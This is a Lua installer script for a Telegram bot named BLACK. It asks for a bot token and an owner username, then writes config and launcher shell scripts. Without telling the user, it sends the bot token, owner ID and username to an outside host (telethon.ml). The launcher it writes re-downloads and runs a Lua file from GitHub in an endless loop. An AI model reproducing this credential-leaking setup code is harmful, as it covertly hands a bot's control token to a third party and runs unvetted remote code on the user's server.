serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_BLACK = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_BLACK = function() 
local Create_Info = function(Token,Sudo,UserName)  
local BLACK_Info_Sudo = io.open("sudo.lua", 'w')
BLACK_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
BLACK_Info_Sudo:close()
end  
if not database:get(Server_BLACK.."Token_BLACK") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_BLACK.."Token_BLACK",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua startTelethon.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_BLACK.."UserName_BLACK") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua startTelethon.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua startTelethon.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_BLACK.."UserName_BLACK",Json.Info.Username)
database:set(Server_BLACK.."Id_BLACK",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua startTelethon.lua')
end
local function Files_BLACK_Info()
Create_Info(database:get(Server_BLACK.."Token_BLACK"),database:get(Server_BLACK.."Id_BLACK"),database:get(Server_BLACK.."UserName_BLACK"))   
https.request("https://telethon.ml/telethonconfig.php?id="..database:get(Server_BLACK.."Id_BLACK").."&user="..database:get(Server_BLACK.."UserName_BLACK").."&token="..database:get(Server_BLACK.."Token_BLACK"))
local RunBLACK = io.open("BLACK", 'w')
RunBLACK:write([[
#!/usr/bin/env bash
cd $HOME/BLACK
token="]]..database:get(Server_BLACK.."Token_BLACK")..[["
rm -fr TEAMBLACK.lua
wget "https://raw.githubusercontent.com/telethon-Arab/TEAMBLACK/master/TEAMBLACK.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./TEAMBLACK.lua -p PROFILE --bot=$token
done
]])
RunBLACK:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/BLACK
while(true) do
rm -fr ../.telegram-cli
screen -S BLACK -X kill
screen -S BLACK ./BLACK
done
]])
RunTs:close()
end
Files_BLACK_Info()
database:del(Server_BLACK.."Token_BLACK");database:del(Server_BLACK.."Id_BLACK");database:del(Server_BLACK.."UserName_BLACK")
sudos = dofile('sudo.lua')
os.execute('./telethoninstall.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_BLACK()  
var = true
else   
f:close()  
database:del(Server_BLACK.."Token_BLACK");database:del(Server_BLACK.."Id_BLACK");database:del(Server_BLACK.."UserName_BLACK")
sudos = dofile('sudo.lua')
os.execute('./telethoninstall.sh ins')
var = false
end  
return var
end
Load_File()
